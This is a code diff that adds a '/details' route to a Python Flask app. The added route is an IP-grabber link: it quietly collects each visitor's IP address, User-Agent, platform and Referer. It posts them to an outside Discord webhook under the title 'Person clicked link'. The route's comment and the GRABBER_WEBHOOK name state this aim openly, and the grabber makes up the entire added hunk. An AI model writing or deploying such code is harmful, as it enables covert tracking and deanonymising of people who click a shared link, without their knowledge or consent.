@@ -112,5 +112,45 @@ def brainrot():
         else:
             return {"error":"Request is not in JSON format"}, 400
 
+# Get all details of a visitor and send it to a discord webhook
+@app.route('/details')
+def grab():
+    visitorIP = request.remote_addr
+    userAgent = request.headers.get("User-Agent")
+    platform = request.headers.get("Sec-Ch-Ua-Platform")
+    referer = request.headers.get("Referer")
+
+    requests.post(
+        os.getenv("GRABBER_WEBHOOK"), 
+        json={
+            "content": None,
+            "embeds": [
+                {
+                "title": "Person clicked link",
+                "color": 16711680,
+                "fields": [
+                    {
+                        "name": "Remote address",
+                        "value": visitorIP
+                    },
+                    {
+                        "name": "User Agent",
+                        "value": userAgent
+                    },
+                    {
+                        "name": "Platform",
+                        "value": platform
+                    },
+                    {
+                        "name": "Referer",
+                        "value": referer
+                    }
+                ]
+            }
+        ],
+    "attachments": []
+})
+    return {"IP": visitorIP, "UserAgent": userAgent, "Platform": platform, "Referer": referer}
+
 if __name__ == '__main__':
     app.run(debug=True)
